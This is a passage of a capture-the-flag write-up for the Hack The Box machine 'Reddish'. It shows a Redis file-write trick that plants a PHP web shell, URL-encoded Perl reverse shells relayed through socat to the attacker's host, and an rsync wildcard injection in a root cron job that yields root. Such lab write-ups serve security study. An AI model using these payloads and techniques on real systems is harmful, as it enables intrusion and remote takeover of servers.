class="line">                                cache: <span class="literal">false</span>,</span><br><span class="line">                                dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">                                success: <span class="keyword">function</span> (data) &#123;</span><br><span class="line">                              console.log(<span class="string">&quot;HITS incremented:&quot;</span>, data);</span><br><span class="line">                                &#125;,</span><br><span class="line">                                error: <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        /*</span><br><span class="line">                            * TODO</span><br><span class="line">                            *</span><br><span class="line">                            * 1. Share the web folder with the database container (Done)</span><br><span class="line">                            * 2. Add here the code to backup databases <span class="keyword">in</span> /f187a0ec71ce99642e4f0afbd441a68b folder</span><br><span class="line">                            * ...Still don<span class="string">&#x27;t know how to complete it...</span></span><br><span class="line"><span class="string">                        */</span></span><br><span class="line"><span class="string">                        function backupDatabase() &#123;</span></span><br><span class="line"><span class="string">                                $.ajax(&#123;</span></span><br><span class="line"><span class="string">                                        url: &quot;8924d0549008565c554f8128cd11fda4/ajax.php?backup=...&quot;,</span></span><br><span class="line"><span class="string">                                        cache: false,</span></span><br><span class="line"><span class="string">                                        dataType: &quot;text&quot;,</span></span><br><span class="line"><span class="string">                                        success: function (data) &#123;</span></span><br><span class="line"><span class="string">                                            console.log(&quot;Database saved:&quot;, data);</span></span><br><span class="line"><span class="string">                                        &#125;,</span></span><br><span class="line"><span class="string">                                        error: function () &#123;</span></span><br><span class="line"><span class="string">                                        &#125;</span></span><br><span class="line"><span class="string">                                &#125;);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;This is the default web page for this server.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>There’s two important take-aways from this source:</p>
<ul>
<li><p>1.There are ajax calls to 8924d0549008565c554f8128cd11fda4/ajax.php. Based on the parameters values for the text of get hits and incr hits (which look like redis commands), I can hypothesize that these commands are executed on the redis database.</p>
</li>
<li><p>There’s some self-proclaimed incomplete code having to do with backing up that database. It does indicate that the web folder is shared with the database container.</p>
</li>
</ul>
<p>I can also test out these function in the firefox debug console:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">13:17:49.521 getData()</span><br><span class="line">13:17:49.668 undefined</span><br><span class="line">13:17:51.757 Number of hits: 1 127.0.0.1:19:20</span><br><span class="line">13:17:59.877 incrCounter()</span><br><span class="line">13:17:59.884 undefined</span><br><span class="line">13:18:05.446 getData()</span><br><span class="line">13:18:05.453 undefined</span><br><span class="line">13:18:07.953 Number of hits: 2</span><br></pre></td></tr></table></figure>

<p>What about trying to exercise the backup function? Visiting</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/ajax.php?backup=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>eventually has a timeout, which makes sense since the comments said it was not yet implemented:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Exception: Cant <span class="built_in">read</span> line from socket. <span class="keyword">in</span> /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php:74 Stack trace: <span class="comment">#0 /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php(101): Client-&gt;readLine() #1 /var/www/html/8924d0549008565c554f8128cd11fda4/ajax.php(9): Client-&gt;sendCmd(NULL) #2 &#123;main&#125; thrown in /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php on line 74</span></span><br></pre></td></tr></table></figure>

<p>This error message does give me the absolute web path, which is the default apache path</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>

<h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><p>So I can do some interaction with the database through the website and JavaScript… But I can also interact directly with the Redis database.<br>Just like with www, I’ll use meterpreter to set up a tunnel into the subnet with www and redis:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 6379 -r 172.19.0.4 -p 6379</span><br><span class="line">[*] Local TCP relay created: :6379 &lt;-&gt; 172.19.0.4:6379</span><br></pre></td></tr></table></figure>

<p>do basic enumeration with nc:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 127.0.0.1 6379</span></span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">2</span><br><span class="line">incr hits</span><br><span class="line">:3</span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">3</span><br><span class="line">incr hits</span><br><span class="line">:4</span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>install redis-cli for interaction with the db:</p>
<p>apt-get install redis-tools</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># redis-cli   # by default, connects to localhost 6379</span></span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">(0.58s)</span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">(0.57s)</span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 7</span><br><span class="line">(0.58s)</span><br><span class="line">127.0.0.1:6379&gt; get hits</span><br><span class="line"><span class="string">&quot;7&quot;</span></span><br><span class="line">(0.63s)</span><br></pre></td></tr></table></figure>

<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p><span class="exturl" data-url="aHR0cHM6Ly9wYWNrZXRzdG9ybXNlY3VyaXR5LmNvbS9maWxlcy8xMzQyMDAvUmVkaXMtUmVtb3RlLUNvbW1hbmQtRXhlY3V0aW9uLmh0bWw=">This post<i class="fa fa-external-link-alt"></i></span> on PacketStorm details how I can use Redis to write arbitrary files on disk. I can flush the database, write some data into it, and then back it up to a target location. The article talks about writing an SSH key. SSH isn’t enabled here, but, because I know that the database server shares disk space with www, I can write a web shell.</p>
<ul>
<li>Exploit Limitations</li>
</ul>
<p>This isn’t by any means perfect. For example, the database will compress repeated text patterns, so could I lose some of the text I want to write. So for example, when I tried to write <br/> into multiple places in a php file, only the first actually made it through as desired. Even if I tried using <br/> and <br />, the second &lt;br was replaced with binary data. Similarly, when I wrote a command to get a perl reverse shell, the pattern ,”&gt;&amp;S”); was replaced and thus broke the script.</p>
<ul>
<li>Exploit to WebShell<br>Luckily for me, I can write a simple php webshell, and there’s no repeats, and php doesn’t care about garbage before or after the shell.</li>
</ul>
<p>Steps (all in redis-cli):</p>
<ul>
<li>flush the database</li>
<li>write shell to database</li>
<li>set directory</li>
<li>set filename</li>
<li>save</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat redis.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># redis-cli -h 127.0.0.1  flushall</span></span><br><span class="line">OK</span><br><span class="line">root@kali:~<span class="comment"># cat redis.txt | redis-cli -x set crackit</span></span><br><span class="line">OK</span><br><span class="line">root@kali:~<span class="comment"># redis-cli</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/www/html/8924d0549008565c554f8128cd11fda4/</span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">&quot;df.php&quot;</span></span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">(0.58s)</span><br></pre></td></tr></table></figure>

<p>Now check out <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS84OTI0ZDA1NDkwMDg1NjVjNTU0ZjgxMjhjZDExZmRhNC9kZi5waHA/Y21kPWlk">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=id<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�&#125;_�used-mem¨? �aof-preamble���crackit+ uid=33(www-data) gid=33(www-data) groups=33(www-data) ��Z<span class="string">&quot;,���</span></span><br></pre></td></tr></table></figure>

<p>hostname shows the host is named www:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�&#125;_�used-mem¨? �aof-preamble���crackit+ www ��Z<span class="string">&quot;,���</span></span><br></pre></td></tr></table></figure>

<h3 id="Script-Redis-WebShell"><a href="#Script-Redis-WebShell" class="headerlink" title="Script Redis WebShell"></a>Script Redis WebShell</h3><p>The files in the web directory seem to be cleared out every 3 minutes (I’ll confirm this soon), so scripted the upload:</p>
<p>upload_shell.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 flushall</span><br><span class="line">cat redis.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 127.0.0.1 config <span class="built_in">set</span> dir /var/www/html/8924d0549008565c554f8128cd11fda4/</span><br><span class="line">redis-cli -h 127.0.0.1 config <span class="built_in">set</span> dbfilename <span class="string">&quot;df.php&quot;</span></span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br></pre></td></tr></table></figure>

<p>then run the script:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># ./upload_shell.sh </span></span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h3 id="Interactive-Shell"><a href="#Interactive-Shell" class="headerlink" title="Interactive Shell"></a>Interactive Shell</h3><ul>
<li>Connectivity socat</li>
</ul>
<p>It doesn’t look like I can connect all the back to kali from this host. which ping returns /bin/ping, but trying to ping 10.10.14.9 doesn’t result in anything when watching in tcpdump. When I try to ping 172.19.0.3 (nodered), I get results</p>
<p>So I need to pivot through nodered. I’ll upload a static copy of socat to the box using the Node-Red flow for upload. Now I can use socat one of two ways:</p>
<ul>
<li>Relay traffic through nodered back to kali</li>
<li>Catch the callback on nodered</li>
</ul>
<p>do the first one, so in the shell on nodered, create a tunnel:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/tmp</span><br><span class="line"><span class="comment"># ./socat tcp-listen:223,fork tcp:10.10.14.9:223 &amp;</span></span><br></pre></td></tr></table></figure>

<p>That will run in the background, and forward any traffic that hits port 223 on nodered to my workstation on port 223.</p>
<ul>
<li>Execution<br>And, like nodered, there’s a limited toolset available. Luckily, perl is still present (a phrase I never thought I’d say).</li>
</ul>
<p>To get this working, it took a fair amount of playing with the url encoding. In the end, I had success by visiting the following url in a browser:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=perl%20<span class="_">-e</span>%20%27use%20Socket%3b<span class="variable">$i</span>%3d%22172.19.0.2%22%3b<span class="variable">$p</span>%3d223%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b&#125;%3b%27</span><br></pre></td></tr></table></figure>

<p>then we got the shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 223</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::223</span><br><span class="line">Ncat: Listening on 0.0.0.0:223</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:50210.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ ip addr</span></span><br><span class="line"><span class="string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span></span><br><span class="line"><span class="string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span></span><br><span class="line"><span class="string">    inet 127.0.0.1/8 scope host lo</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">13: eth1@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth1</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">$ ls -la</span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 5 root root 4096 Jul 15  2018 ..</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root    9 Jul 16  2018 .bash_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000  220 Apr 23  2018 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000 3771 Apr 23  2018 .bashrc</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000  655 Apr 23  2018 .profile</span></span><br><span class="line"><span class="string">-r-------- 1 1000 1000   33 Apr 23  2018 user.txt</span></span><br></pre></td></tr></table></figure>

<p>ajax.php, which shows the commands running at the redis server:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat ajax.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once <span class="string">&#x27;lib/Autoloader.php&#x27;</span>;</span><br><span class="line">Autoloader::register();</span><br><span class="line"><span class="variable">$json</span> = new JsonResult();</span><br><span class="line"><span class="variable">$config</span> = new Config();</span><br><span class="line">foreach (<span class="variable">$config</span>-&gt;getPool() as <span class="variable">$key</span> =&gt; <span class="variable">$server</span>) &#123;</span><br><span class="line">        <span class="variable">$client</span> = new Client(<span class="variable">$server</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$client</span>-&gt;sendCmd(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privesc-www-data-to-usertxt"><a href="#Privesc-www-data-to-usertxt" class="headerlink" title="Privesc www-data to usertxt"></a>Privesc www-data to usertxt</h2><h3 id="Identifying-Backup-Cron"><a href="#Identifying-Backup-Cron" class="headerlink" title="Identifying Backup Cron"></a>Identifying Backup Cron</h3><p>To get to user.txt, I’ll need to privesc. Looking around the box, there wasn’t a ton going on, so I decided to look for interesting processes starting and stopping. I’ve been a huge fan of pspy in the past for this, but since I’m two hops deep at this point, I’ll just using a bash script:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IFS=$<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">old=$(ps -eo <span class="built_in">command</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    new=$(ps -eo <span class="built_in">command</span>)</span><br><span class="line">    diff &lt;(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$old</span>&quot;</span>) &lt;(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new</span>&quot;</span>) | grep [\&lt;\&gt;]</span><br><span class="line">    sleep .3</span><br><span class="line">    old=<span class="variable">$new</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>Running it shows some interesting scripts being run about every 3 minutes:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./proc.sh</span><br><span class="line">&gt; /usr/sbin/CRON</span><br><span class="line">&gt; /bin/sh -c sh /backup/backup.sh</span><br><span class="line">&gt; sh /backup/backup.sh</span><br><span class="line">&gt; rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line">&gt; rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br></pre></td></tr></table></figure>

<p>Looking at /backup/backup.sh, it is saving the database, then removing the web folders and bringing them back in from a host named backup:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /backup/backup.sh</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line">rsync -a *.rdb rsync://backup:873/src/rdb/</span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; rm -rf /var/www/html/*</span><br><span class="line">rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line">chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploiting the Wildcard</li>
</ul>
<p>I can exploit the command rsync -a *.rdb rsync://backup:873/src/rdb, specifically the wildcard character. Because of how Unix handles wildcards, I can create a file named -e sh p.rdb, and that will evaluate to run sh p.rdb. The technique is detailed <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVmZW5zZWNvZGUuY29tL3B1YmxpYy9EZWZlbnNlQ29kZV9Vbml4X1dpbGRDYXJkc19Hb25lX1dpbGQudHh0">here<i class="fa fa-external-link-alt"></i></span>.</p>
<p>I’ll first set up a tunnel on nodered:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./socat tcp-listen:9010,fork tcp:10.10.14.9:9010 &amp;</span></span><br></pre></td></tr></table></figure>

<p>Now write a perl reverse shell into a file and create the other file to run it. I’ll use base64 to easily move small files back and forth:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># cat shell.txt </span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.19.0.2&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># cat shell.txt | base64</span></span><br><span class="line">cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9J</span><br><span class="line">TkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2th</span><br><span class="line">ZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQs</span><br><span class="line">Ij4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg==</span><br></pre></td></tr></table></figure>

<p>I’ll create my reverse shell script as p.rdb, and then create the file that will call that abusing the wildcard with touch:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb</span><br><span class="line">$ touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb</span><br></pre></td></tr></table></figure>

<p>When the cron runs, I’ll catch a callback as root on www when the backup script runs:</p>
<p>and grab user.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9010</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9010</span><br><span class="line">Ncat: Listening on 0.0.0.0:9010</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:54802.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># pwd</span></span><br><span class="line"><span class="string">/var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span></span><br><span class="line"><span class="string"># cd /home</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">bergamotto</span></span><br><span class="line"><span class="string">lost+found</span></span><br><span class="line"><span class="string">somaro</span></span><br><span class="line"><span class="string"># cd somaro</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string"># cat user.txt</span></span><br><span class="line"><span class="string">c09aca7cb02c968b1e9637d51661f129</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb54.jpg"></li>
</ul>
<h3 id="File-Upload-to-www"><a href="#File-Upload-to-www" class="headerlink" title="File Upload to www"></a>File Upload to www</h3><p>To move to the next steps, I’ll want to get files uploaded to www, which is challenging without curl, wget, or nc. Here’s how I do it:</p>
<p>Start a tunnel on nodered that will listen (in this case on 8080) and forward that to my host:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./socat TCP-LISTEN:8080,fork TCP:10.10.14.9:8888 &amp;</span></span><br></pre></td></tr></table></figure>

<p>Use perl to request file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># perl -e &#x27;use File::Fetch; my $url = &quot;http://172.19.0.2:8080/socat&quot;; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Serve from workstation:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python3 -m http.server 8888</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span><br><span class="line">10.10.10.94 - - [25/Jul/2020 16:39:20] <span class="string">&quot;GET /socat HTTP/1.1&quot;</span> 304 -</span><br></pre></td></tr></table></figure>

<h2 id="backup-Container"><a href="#backup-Container" class="headerlink" title="backup Container"></a>backup Container</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>The backup script not only provides a path to root on www, but it also tells me about another host, backup. If I ping -c 1 backup, I’ll see it resolves to 127.20.0.2. I’ll upload nmap to www and see what’s open:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- --min-rate 5000 172.20.0.3</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-25 12:36 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.000034s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">873/tcp open  rsync</span><br><span class="line">MAC Address: 02:42:AC:14:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.23 seconds</span><br></pre></td></tr></table></figure>

<p>open on 873, rsync, which is how www was connecting to it.</p>
<p>I’ll update my diagram:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb55.jpg"></li>
</ul>
<h3 id="rsync-access"><a href="#rsync-access" class="headerlink" title="rsync access"></a>rsync access</h3><p>rsync gives me full read and write access to backup. I can read the file system:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src</span></span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 .</span><br><span class="line">-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv</span><br><span class="line">-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:41 backup</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 bin</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 boot</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 data</span><br><span class="line">drwxr-xr-x          3,720 2020/07/25 14:50:42 dev</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 etc</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 home</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 lib</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 media</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 opt</span><br><span class="line">dr-xr-xr-x              0 2020/07/25 14:50:42 proc</span><br><span class="line">drwxr-xr-x          4,096 2020/07/25 20:16:01 rdb</span><br><span class="line">drwx------          4,096 2018/07/15 17:42:38 root</span><br><span class="line">drwxr-xr-x          4,096 2020/07/25 14:50:43 run</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:38 srv</span><br><span class="line">dr-xr-xr-x              0 2020/07/25 14:50:42 sys</span><br><span class="line">drwxrwxrwt          4,096 2020/07/25 21:18:01 tmp</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 usr</span><br><span class="line">drwxr-xr-x          4,096 2018/07/15 17:42:39 var</span><br></pre></td></tr></table></figure>

<p>I can write to the file system:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2018/07/26 21:27:16 .</span><br><span class="line"><span class="comment"># rsync luci rsync://backup:873/src/tmp/</span></span><br><span class="line"><span class="comment"># rsync rsync://backup:873/src/tmp/</span></span><br><span class="line">drwxrwxrwt          4,096 2018/07/26 21:27:34 .</span><br><span class="line">-rw-r--r--              0 2018/07/26 21:27:34 luci</span><br></pre></td></tr></table></figure>

<h3 id="Shell-via-Cron"><a href="#Shell-via-Cron" class="headerlink" title="Shell via Cron"></a>Shell via Cron</h3><p>I’ll use the read / write access to verify that cron is enabled, and then write one to get shell.<br>There’s already a cron named clean in the folder, which is a good sign that cron is enabled:</p>
